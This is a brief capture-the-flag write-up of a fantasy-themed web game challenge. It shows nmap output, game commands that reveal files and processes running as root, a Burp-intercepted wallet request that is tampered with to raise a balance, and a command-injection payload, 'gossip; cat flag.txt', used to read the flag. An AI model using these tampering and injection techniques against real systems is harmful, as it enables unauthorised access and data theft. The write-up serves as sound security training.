
```sh
nmap -sC -sV -T4 83.136.251.13

PORT      STATE    SERVICE      VERSION
19/tcp    filtered chargen
22/tcp    open     ssh          OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
111/tcp   open     rpcbind      2-4 (RPC #100000)
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
31337/tcp open     http         Gunicorn
32773/tcp open     http         Werkzeug httpd 3.1.3 (Python 3.13.0b4)
34573/tcp open     http         Werkzeug httpd 3.1.3 (Python 3.13.2)
35500/tcp open     http         Gunicorn
38292/tcp open     http         Gunicorn
49159/tcp open     http         nginx 1.26.1
49165/tcp open     http         Werkzeug httpd 3.1.3 (Python 3.13.0b4)
49167/tcp open     http         Werkzeug httpd 3.1.3 (Python 3.13.0b4)
49999/tcp open     http         nginx
57797/tcp open     http         Apache httpd 2.4.54 ((Debian))
```

http://83.136.251.13:36871/

```sh
> gossip
🐴 'Riders in black were seen near Bree... silent as the grave.'
🦉 'A ranger from the North speaks of trolls gathering in the wild... something stirs in the dark.'
👻 'The barmaid whispers about a ghost haunting the old ruins near Bree... eerie wails at night.'
⚔️ 'An ancient prophecy speaks of a warrior destined to wield a forgotten blade... could it be you?'
⛏️ 'The dwarves delve too deep in Moria... some say they've awoken something.'

eslint.config.js
flag.txt
index.html
node_modules
package.json
postcss.config.js
public
server
src
tailwind.config.js
tsconfig.app.json
tsconfig.json
tsconfig.node.json
vite.config.ts
yarn.lock
```

```sh
> observe
🎶 A bard strums a sorrowful tune, the melody haunting yet beautiful.

PID   USER     TIME  COMMAND
    1 root      0:00 {supervisord} /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisord.conf
    6 root      0:00 node /opt/yarn-v1.22.22/bin/yarn.js dev:backend
    7 root      0:00 node /opt/yarn-v1.22.22/bin/yarn.js dev:frontend
    8 root      0:00 nginx: master process nginx -g daemon off;
   29 nginx     0:00 nginx: worker process
   50 root      0:03 /usr/local/bin/node /app/node_modules/.bin/vite
   51 root      0:00 /usr/local/bin/node server/index.js
   72 root      0:01 /app/node_modules/@esbuild/linux-x64/bin/esbuild --service=0.21.5 --ping
   82 root      0:00 ps aux
```

```sh
> examine

👁️ Your reflection in the tavern's dusty mirror reveals... root
```

After playing a dice game, and winning it with the amount of 1, on Burp Suite, I saw the Post request as following:

```sh
POST /api/wallet HTTP/1.1
Host: 83.136.251.13:36871
Content-Length: 33
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://83.136.251.13:36871
Referer: http://83.136.251.13:36871/
Accept-Encoding: gzip, deflate, br
Cookie: sessionId=kphtde2eqra
Connection: keep-alive

{"action":"increase","amount":1}
```

I modified the body, to the `amount:20` and now it worked, so I injected the amount and it was increased.

To get the flag: `gossip; cat flag.txt`